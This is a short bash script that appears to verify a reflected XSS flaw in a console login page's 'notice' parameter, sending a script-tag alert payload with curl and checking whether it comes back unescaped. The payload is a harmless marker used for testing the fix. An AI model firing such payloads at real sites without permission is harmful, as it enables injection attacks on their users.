#!/usr/bin/env bash
set -euo pipefail
# LG-XSS-001 proof-of-exploit: reflected XSS in the console sign-on notice. Requests the public login
# page with a <script> payload in ?notice=. With rich_notices=on the notice is reflected into the HTML
# unescaped, so the raw <script> tag comes back; fires (exit 0) when the response contains the verbatim
# marker script. With the fix the payload is HtmlEscape'd (&lt;script&gt;) and stays inert. Hits the
# console directly on its published port. Env: PASCAL_URL (default http://localhost:8085).

PASCAL_URL="${PASCAL_URL:-http://localhost:8085}"
MARK="LGXSS$$"
PAYLOAD="<script>alert('$MARK')</script>"

resp="$(curl -sS -G "$PASCAL_URL/login" --data-urlencode "notice=$PAYLOAD")"

if printf '%s' "$resp" | grep -qF "<script>alert('$MARK')</script>"; then
  echo "LG-XSS-001 FIRED: notice reflected unescaped (raw <script> in response, marker $MARK)"
  exit 0
fi
echo "LG-XSS-001 not fired (escaped or absent): $(printf '%s' "$resp" | grep -o "[^<]*$MARK[^>]*" | head -1)" >&2
exit 1
